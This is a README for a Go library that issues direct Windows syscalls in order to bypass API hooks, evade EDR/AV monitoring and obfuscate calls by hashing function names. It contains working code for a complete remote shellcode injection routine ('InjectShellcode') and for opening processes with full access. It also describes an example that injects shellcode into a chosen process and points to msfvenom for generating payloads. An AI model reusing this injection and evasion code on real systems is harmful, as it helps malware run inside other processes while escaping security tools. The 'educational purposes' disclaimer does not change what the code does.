# Windows Direct Syscall Library for Go

A Go library providing **TRUE direct Windows API syscalls** using external assembly and PE parsing. This library enables developers to call any Windows API function directly through syscalls, bypassing traditional API hooking points.

##  Features

- **True Direct Syscalls**: Raw `syscall` instructions with manually resolved syscall numbers
- **No API Dependencies**: Bypasses `GetProcAddress`, `LoadLibrary`, and all traditional Windows APIs
- **External Assembly**: Intel NASM assembly compiled separately and linked via cgo
- **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
- **Obfuscation Support**: Function name hashing for stealth operations
- **Comprehensive Constants**: All common Windows constants included
- **Type Safety**: Strongly typed function signatures for common APIs

## Quick Start

### Installation

```bash
go get github.com/carved4/winapi-direct-syscalls
```

### Basic Usage

```go
package main

import (
    "fmt"
    "unsafe"
    
    winapi "github.com/carved4/winapi-direct-syscalls"
)

func main() {
    // Allocate memory using direct syscalls
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // Current process
    var baseAddress uintptr
    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        winapi.MEM_COMMIT|winapi.MEM_RESERVE,
        winapi.PAGE_READWRITE,
    )
    
    if err != nil {
        panic(err)
    }
    
    if status == winapi.STATUS_SUCCESS {
        fmt.Printf("Memory allocated at: 0x%X\n", baseAddress)
    }
}
```

## API Reference

### Core Functions

#### `DirectSyscall(functionName string, args ...uintptr) (uintptr, error)`
Execute any Windows API function by name using direct syscalls.

```go
// Call any NTDLL function directly
status, err := winapi.DirectSyscall("NtQuerySystemInformation", 
    winapi.SystemBasicInformation,
    uintptr(unsafe.Pointer(&buffer[0])),
    uintptr(len(buffer)),
    uintptr(unsafe.Pointer(&returnLength)),
)
```

#### `DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error)`
Execute syscalls using pre-computed function name hashes for obfuscation.

```go
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
status, err := winapi.DirectSyscallByHash(hash, args...)
```

### Common API Functions

The library provides strongly-typed wrappers for common Windows APIs:

- `NtAllocateVirtualMemory` - Allocate memory in processes
- `NtWriteVirtualMemory` - Write to process memory  
- `NtReadVirtualMemory` - Read from process memory
- `NtProtectVirtualMemory` - Change memory protection
- `NtCreateThreadEx` - Create threads in processes
- `NtOpenProcess` - Open process handles
- `NtQuerySystemInformation` - Query system information
- `NtQueryInformationProcess` - Query process information
- `NtCreateFile` / `NtReadFile` / `NtWriteFile` - File operations
- `NtClose` - Close handles

### Utility Functions

#### `GetSyscallNumber(functionName string) uint16`
Get the syscall number for debugging purposes.

#### `GetFunctionHash(functionName string) uint32`
Get the hash of a function name for obfuscation.

## Build Requirements

### Prerequisites
- **Go 1.20+** with cgo enabled
- **NASM** for assembly compilation
- **GCC/MinGW** for linking (Windows)

### Build Process

The library includes pre-built assembly objects, but you can rebuild them:

```bash
# Assemble the syscall function
nasm -f win64 do_syscall.S -o do_syscall.obj

# Create static library
ar rcs libdo_syscall.a do_syscall.obj

# Build your Go application
go build
```

##  How It Works

### Architecture

```
Your Go Code
     ↓
Library Interface (winapi.go)
     ↓
Hash Resolution (obf package)
     ↓
PE Parsing (syscallresolve package)
     ↓
cgo Bridge (syscall package)
     ↓
Raw NASM Assembly (do_syscall.S)
     ↓
Direct Syscall Instruction
     ↓
Windows NT Kernel
```

### Direct Syscall Flow

1. **Function Name** → **Hash** (DBJ2 algorithm)
2. **PEB Walking** → Find NTDLL base address (no LoadLibrary)
3. **PE Parsing** → Find function address (no GetProcAddress)
4. **Memory Reading** → Extract syscall number from function stub
5. **Assembly Call** → Execute raw `syscall` instruction
6. **Return** → NTSTATUS result

### Assembly Function

The core assembly function in `do_syscall.S`:

```nasm
global do_syscall
section .text

do_syscall:
    mov [rsp - 0x8],  rsi    ; Save registers
    mov [rsp - 0x10], rdi

    mov eax, ecx             ; Syscall number
    mov rcx, rdx             ; First argument
    mov r10, r8              ; Third argument (syscall convention)
    mov rdx, r9              ; Second argument

    ; Handle additional arguments...
    syscall                  ; Execute direct syscall
    
    mov rsi, [rsp - 0x8]     ; Restore registers
    mov rdi, [rsp - 0x10]
    ret
```

## Use Cases

### Security Research
- Bypass API hooks and monitoring
- Analyze Windows internals
- Test EDR/AV evasion techniques

### System Programming
- Low-level Windows operations
- Custom memory management
- Process manipulation
- File system operations

### Stealth Operations
- Avoid API call detection

## Using the WinAPI Library

The `winapi` package provides a high-level interface for Windows syscalls with proper type safety and error handling. Here's how to use it effectively:

### Basic Memory Operations

```go
package main

import (
    "fmt"
    "unsafe"
    
    "github.com/carved4/go-direct-syscall"
)

func main() {
    // Get current process handle
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
    
    // Allocate memory
    var baseAddress uintptr
    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        panic(fmt.Sprintf("Failed to allocate memory: 0x%X", status))
    }
    
    fmt.Printf("Allocated memory at: 0x%X\n", baseAddress)
    
    // Write data to memory
    data := []byte("Hello, World!")
    var bytesWritten uintptr
    
    status, err = winapi.NtWriteVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&data[0]),
        uintptr(len(data)),
        &bytesWritten,
    )
    
    if status == 0 {
        fmt.Printf("Wrote %d bytes successfully\n", bytesWritten)
    }
    
    // Read data back
    buffer := make([]byte, len(data))
    var bytesRead uintptr
    
    status, err = winapi.NtReadVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&buffer[0]),
        uintptr(len(buffer)),
        &bytesRead,
    )
    
    if status == 0 {
        fmt.Printf("Read back: %s\n", string(buffer))
    }
}
```

### Process Manipulation

```go
// Open a process by PID
var processHandle uintptr
pid := uintptr(1234) // Target process ID

// Create CLIENT_ID structure
clientId := struct {
    UniqueProcess uintptr
    UniqueThread  uintptr
}{
    UniqueProcess: pid,
    UniqueThread:  0,
}

status, err := winapi.NtOpenProcess(
    &processHandle,
    0x1F0FFF, // PROCESS_ALL_ACCESS
    0,        // No object attributes
    uintptr(unsafe.Pointer(&clientId)),
)

if status == 0 {
    fmt.Printf("Opened process handle: 0x%X\n", processHandle)
    
    // Don't forget to close the handle
    defer winapi.NtClose(processHandle)
}
```

### Thread Creation and Injection

```go
// Inject shellcode into a remote process
func InjectShellcode(processHandle uintptr, shellcode []byte) error {
    // Allocate memory in target process
    var baseAddress uintptr
    size := uintptr(len(shellcode))
    
    status, err := winapi.NtAllocateVirtualMemory(
        processHandle,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("allocation failed: 0x%X", status)
    }
    
    // Write shellcode
    var bytesWritten uintptr
    status, err = winapi.NtWriteVirtualMemory(
        processHandle,
        baseAddress,
        unsafe.Pointer(&shellcode[0]),
        uintptr(len(shellcode)),
        &bytesWritten,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("write failed: 0x%X", status)
    }
    
    // Change protection to executable
    var oldProtect uintptr
    status, err = winapi.NtProtectVirtualMemory(
        processHandle,
        &baseAddress,
        &size,
        0x20, // PAGE_EXECUTE_READ
        &oldProtect,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("protect failed: 0x%X", status)
    }
    
    // Create thread to execute shellcode
    var threadHandle uintptr
    status, err = winapi.NtCreateThreadEx(
        &threadHandle,
        0x1F03FF, // THREAD_ALL_ACCESS
        0,         // No object attributes
        processHandle,
        baseAddress, // Start address (our shellcode)
        0,           // No parameter
        0,           // No creation flags
        0,           // Zero bits
        0,           // Stack size
        0,           // Maximum stack size
        0,           // No attribute list
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("thread creation failed: 0x%X", status)
    }
    
    fmt.Printf("Created thread handle: 0x%X\n", threadHandle)
    winapi.NtClose(threadHandle)
    
    return nil
}
```

### Using Raw DirectSyscall for Any API

```go
// Call any NTDLL function directly by name
func QuerySystemInfo() {
    // SystemBasicInformation = 0
    var buffer [48]byte // SYSTEM_BASIC_INFORMATION size
    var returnLength uintptr
    
    status, err := winapi.DirectSyscall("NtQuerySystemInformation",
        0, // SystemBasicInformation
        uintptr(unsafe.Pointer(&buffer[0])),
        uintptr(len(buffer)),
        uintptr(unsafe.Pointer(&returnLength)),
    )
    
    if status == 0 {
        fmt.Printf("System info retrieved, %d bytes\n", returnLength)
    }
}

// Use function hash for obfuscation
func ObfuscatedCall() {
    hash := winapi.GetFunctionHash("NtQuerySystemInformation")
    
    status, err := winapi.DirectSyscallByHash(hash,
        0, // SystemBasicInformation
        // ... other args
    )
}
```

### Error Handling

```go
// Proper NTSTATUS checking
func CheckNTStatus(status uintptr, operation string) error {
    if status == 0 {
        return nil // STATUS_SUCCESS
    }
    
    switch status {
    case 0xC0000005:
        return fmt.Errorf("%s failed: ACCESS_VIOLATION", operation)
    case 0xC0000008:
        return fmt.Errorf("%s failed: INVALID_HANDLE", operation)
    case 0xC000000D:
        return fmt.Errorf("%s failed: INVALID_PARAMETER", operation)
    default:
        return fmt.Errorf("%s failed: NTSTATUS 0x%X", operation, status)
    }
}

// Usage example
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err := CheckNTStatus(status, "NtAllocateVirtualMemory"); err != nil {
    log.Fatal(err)
}
```

### Important Notes

1. **Handle Management**: Always close handles with `NtClose()` when done
2. **Error Checking**: Check both the Go error and NTSTATUS return value
3. **Memory Safety**: Be careful with `unsafe.Pointer` conversions
4. **Debugging**: Use `GetSyscallNumber()` to verify function resolution
5. **Timing**: Some operations may require delays (like the debug print in `NtWriteVirtualMemory`)

### Common NTSTATUS Values

- `0x00000000` - STATUS_SUCCESS
- `0xC0000005` - STATUS_ACCESS_VIOLATION  
- `0xC0000008` - STATUS_INVALID_HANDLE
- `0xC000000D` - STATUS_INVALID_PARAMETER
- `0xC0000022` - STATUS_ACCESS_DENIED
- Use function name obfuscation
- Direct kernel communication

## Security Considerations

- **Kernel-level Detection**: Direct syscalls may still be monitored at the kernel level
- **Process Protection**: Some protected processes resist manipulation
- **NTSTATUS Handling**: Always check return codes for error conditions
- **Memory Safety**: Use appropriate memory protection and bounds checking

## Examples

See the cmd/main.go file for an example 

- **Basic Memory Operations**: Allocation, reading, writing
- **Process Manipulation**: Opening processes, thread creation
- **File Operations**: Creating, reading, writing files
- **System Queries**: Getting system and process information
- **Obfuscation**: Using function hashes for stealth

## Testing

```bash
cd go-direct-syscalls

bash build.sh

./cmd.exe -example 

# this will  run the main program to list injectible processes, and prompt for a selection
# the shellcode you're injecting is a simple pop calc shellcode, obviously be smart about running shellcode from github repos
# so feel free to use donut or msfvenom or similar to generate your own calc shellcode and replace GetEmbeddedShellcode func

```

## Contributing

Contributions are welcome! Please feel free to:

- Add more Windows API function wrappers
- Improve error handling
- Add more comprehensive examples
- Optimize performance
- Add support for additional architectures

## License

This project is provided for **educational and research purposes only**. Users are responsible for complying with all applicable laws and regulations.

## Credits

- **Original Concept**: Extracted from [Whitecat18's Rust implementation](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/syscalls/direct_syscalls)
- **Assembly Implementation**: Based on [janoglezcampos/rust_syscalls](https://github.com/janoglezcampos/rust_syscalls)

##  Disclaimer

This tool is provided for **educational and research purposes only**. Use of this software for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
